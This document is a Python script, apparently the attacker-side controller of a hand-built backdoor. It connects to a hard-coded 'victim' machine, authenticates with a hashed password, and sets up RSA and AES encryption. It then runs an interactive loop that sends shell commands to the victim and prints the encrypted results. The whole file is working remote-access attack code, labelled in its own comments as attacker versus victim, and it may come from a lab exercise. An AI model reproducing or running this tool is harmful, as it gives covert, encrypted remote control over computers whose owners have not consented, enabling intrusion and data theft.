import sys
import socket
import hashlib
import secrets
import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Check if the password argument is provided
if len(sys.argv) != 2:
    print("Usage: python3 apple.py <password>")
    sys.exit(1)

# Get the password from the command line argument
PASSWORD = sys.argv[1]

# Create a function to hash the password
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# Hash the password
hashed_password = hash_password(PASSWORD)

VICTIM_HOST = "10.0.2.5"  # Replace with the actual IP address of the victim machine
VICTIM_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

victim = socket.socket()
victim.connect((VICTIM_HOST, VICTIM_PORT))

# Send the hashed password to the victim for verification
victim.send(hashed_password.encode())

# Receive the public key from the victim
victim_public_key = victim.recv(BUFFER_SIZE)

# Generate an RSA key pair for asymmetric encryption
attacker_private_key = RSA.generate(2048)
attacker_public_key = attacker_private_key.publickey()

# Send the server's public key to the attacker
transfer_public_key = attacker_public_key.export_key()
victim.send(transfer_public_key)

#print("attacker:", attacker_public_key.export_key())
#print("victim:", victim_public_key)

# AT THIS POINT, I HAVE BOTH PUBLIC KEYS

# Generate a symmetric key to send over
symmetric_key = secrets.token_bytes(16)

# Generate a cipher using the victim public key, send symmetric key to victim
victim_cipher = PKCS1_OAEP.new(RSA.import_key(victim_public_key))
enc_symmetric_key = victim_cipher.encrypt(symmetric_key)
victim.send(enc_symmetric_key)

#print(symmetric_key)
# AT THIS POINT, THE SYMMETRIC KEYS MATCH

# get the initial cwd
encrypted_output = victim.recv(BUFFER_SIZE)
ciphertext, tag, nonce = encrypted_output.split(SEPARATOR.encode())
temp_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX, nonce)
cwd = temp_sym_cipher.decrypt_and_verify(ciphertext, tag).decode()

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    
    next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX)
    ciphertext, tag = next_sym_cipher.encrypt_and_digest(command.encode())
    victim.send(ciphertext + SEPARATOR.encode() + tag + SEPARATOR.encode() + next_sym_cipher.nonce)

    if command.lower() == "exit":
        break

    # Receive and decrypt the output from the victim
    encrypted_output = victim.recv(BUFFER_SIZE)
    ciphertext, tag, nonce = encrypted_output.split(SEPARATOR.encode())
    next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX, nonce)
    plaintext = next_sym_cipher.decrypt_and_verify(ciphertext, tag).decode()
    results, cwd = plaintext.split(SEPARATOR)


    print(results)

victim.close()